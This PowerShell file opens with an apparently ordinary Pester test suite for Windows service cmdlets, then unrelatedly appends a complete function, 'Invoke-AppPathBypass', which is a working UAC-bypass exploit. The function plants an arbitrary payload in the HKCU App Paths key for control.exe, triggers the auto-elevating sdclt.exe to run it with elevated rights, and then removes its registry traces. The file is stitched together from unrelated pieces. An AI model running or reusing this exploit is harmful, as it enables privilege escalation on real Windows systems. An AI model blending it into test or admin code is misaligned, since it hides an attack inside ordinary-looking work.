

Describe "Control Service cmdlet tests" -Tags "Feature","RequireAdminOnWindows" {
  BeforeAll {
    $originalDefaultParameterValues = $PSDefaultParameterValues.Clone()
    if ( -not $IsWindows ) {
        $PSDefaultParameterValues["it:skip"] = $true
    }
  }
  AfterAll {
    $global:PSDefaultParameterValues = $originalDefaultParameterValues
  }

  It "StopServiceCommand can be used as API for '<parameter>' with '<value>'" -TestCases @(
    @{parameter="Force";value=$true},
    @{parameter="Force";value=$false},
    @{parameter="NoWait";value=$true},
    @{parameter="NoWait";value=$false}
  ) {
    param($parameter, $value)
    $stopservicecmd = [Microsoft.PowerShell.Commands.StopServiceCommand]::new()
    $stopservicecmd.$parameter = $value
    $stopservicecmd.$parameter | Should -Be $value
  }

  It "RestartServiceCommand can be used as API for '<parameter>' with '<value>'" -TestCases @(
    @{parameter="Force";value=$true},
    @{parameter="Force";value=$false}
  ) {
    param($parameter, $value)
    $restartservicecmd = [Microsoft.PowerShell.Commands.RestartServiceCommand]::new()
    $restartservicecmd.$parameter = $value
    $restartservicecmd.$parameter | Should -Be $value
  }

  It "Stop/Start/Restart-Service works" {
    $wasStopped = $false
    try {
      $spooler = Get-Service Spooler
      $spooler | Should -Not -BeNullOrEmpty
      if ($spooler.Status -ne "Running") {
        $wasStopped = $true
        $spooler = Start-Service Spooler -PassThru
      }
      $spooler.Status | Should -BeExactly "Running"
      $spooler = Stop-Service Spooler -PassThru
      $spooler.Status | Should -BeExactly "Stopped"
      (Get-Service Spooler).Status | Should -BeExactly "Stopped"
      $spooler = Start-Service Spooler -PassThru
      $spooler.Status | Should -BeExactly "Running"
      (Get-Service Spooler).Status | Should -BeExactly "Running"
      Stop-Service Spooler
      (Get-Service Spooler).Status | Should -BeExactly "Stopped"
      $spooler = Restart-Service Spooler -PassThru
      $spooler.Status | Should -BeExactly "Running"
      (Get-Service Spooler).Status | Should -BeExactly "Running"
    } finally {
      if ($wasStopped) {
        Stop-Service Spooler
      }
    }
  }

  It "Suspend/Resume-Service works" {
    try {
      $originalState = "Running"
      $serviceName = "WerSvc"
      $service = Get-Service $serviceName
      if ($service.Status -ne $originalState) {
        $originalState = $service.Status
        Start-Service $serviceName
      }
      $service | Should -Not -BeNullOrEmpty
      Suspend-Service $serviceName
      (Get-Service $serviceName).Status | Should -BeExactly "Paused"
      Resume-Service $serviceName
      (Get-Service $serviceName).Status | Should -BeExactly "Running"
    } finally {
      Set-Service $serviceName -Status $originalState
    }
  }

  It "Failure to control service with '<script>'" -TestCases @(
    @{script={Stop-Service dcomlaunch -ErrorAction Stop};errorid="ServiceHasDependentServices,Microsoft.PowerShell.Commands.StopServiceCommand"},
    @{script={Suspend-Service winrm -ErrorAction Stop};errorid="CouldNotSuspendServiceNotSupported,Microsoft.PowerShell.Commands.SuspendServiceCommand"},
    @{script={Resume-Service winrm -ErrorAction Stop};errorid="CouldNotResumeServiceNotSupported,Microsoft.PowerShell.Commands.ResumeServiceCommand"},
    @{script={Stop-Service $(new-guid) -ErrorAction Stop};errorid="NoServiceFoundForGivenName,Microsoft.PowerShell.Commands.StopServiceCommand"},
    @{script={Start-Service $(new-guid) -ErrorAction Stop};errorid="NoServiceFoundForGivenName,Microsoft.PowerShell.Commands.StartServiceCommand"},
    @{script={Resume-Service $(new-guid) -ErrorAction Stop};errorid="NoServiceFoundForGivenName,Microsoft.PowerShell.Commands.ResumeServiceCommand"},
    @{script={Suspend-Service $(new-guid) -ErrorAction Stop};errorid="NoServiceFoundForGivenName,Microsoft.PowerShell.Commands.SuspendServiceCommand"},
    @{script={Restart-Service $(new-guid) -ErrorAction Stop};errorid="NoServiceFoundForGivenName,Microsoft.PowerShell.Commands.RestartServiceCommand"}
  ) {
      param($script,$errorid)
      { & $script } | Should -Throw -ErrorId $errorid
  }

}
function Invoke-AppPathBypass {


    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Payload,

        [Switch]
        $Force
    )
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        "UAC is set to 'Always Notify'. This module does not bypass this setting."
        exit
    }
    else{
        
        $AppPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
        if ($Force -or ((Get-ItemProperty -Path $AppPath -ErrorAction SilentlyContinue) -eq $null)){
            New-Item $AppPath -Force |
                New-ItemProperty -Name '(default)' -Value $Payload -PropertyType string -Force | Out-Null
        }else{
            Write-Warning "Key already exists, consider using -Force"
            exit
        }

        if (Test-Path $AppPath) {
            Write-Verbose "Created registry entries for control.exe App Path"
        }else{
            Write-Warning "Failed to create registry key, exiting"
            exit
        }

        $sdcltPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'sdclt.exe'
        if ($PSCmdlet.ShouldProcess($sdcltPath, 'Start process')) {
            $Process = Start-Process -FilePath $sdcltPath  -PassThru
            Write-Verbose "Started sdclt.exe"
        }

        
        Write-Verbose "Sleeping 5 seconds to trigger payload"
        if (-not $PSBoundParameters['WhatIf']) {
            Start-Sleep -Seconds 5
        }

        if (Test-Path $AppPath) {
            
            Remove-Item $AppPath -Recurse -Force
            Write-Verbose "Removed registry entries"
        }

        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
            Stop-Process -Id $Process.Id
            Write-Verbose "Killed running sdclt process"
        }
    }
}
